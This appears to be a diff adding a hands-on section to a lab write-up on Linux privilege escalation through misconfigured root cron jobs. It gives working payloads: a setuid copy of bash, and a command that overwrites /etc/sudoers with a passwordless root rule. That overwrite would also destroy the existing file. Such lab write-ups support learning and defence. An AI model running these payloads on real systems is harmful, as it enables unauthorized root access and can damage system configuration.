@@ -57,4 +57,36 @@ If misconfigured, cron jobs can exploit high privileges and gain unauthorised ac
 
 # Practical
 
-....
+I began by identifying which cron jobs the user has access to with `crontab -e`, for local cron jobs, or `cat /etc/crontab` for system-wide cron jobs. With `cat /etc/crontab` 
+
+```
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+These four cron jobs are executed as root. Since '/home/karen/backup.sh' is owned by the user, I will be targeting this cron job to escalate privileges. I check the permissions of the shell script with
+```
+ls -l /home/karen/backup.sh
+```
+The script only has read and write permissions for the file owner, so I add execute permissions to allow the script to be executed.
+```
+chmod +x /home/karen/backup.sh
+```
+Now that the cron job can be executed, we can modify the file with two payloads to escalate privileges.
+
+## Method 1
+
+The following payload 
+
+`cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
+
+'/tmp/bash -p'
+
+## Method 2
+
+Alternatively, you can add your user to the /etc/sudoers file.
+
+```
+echo "karen ALL=(root) NOPASSWD: ALL" > /etc/sudoers
+```
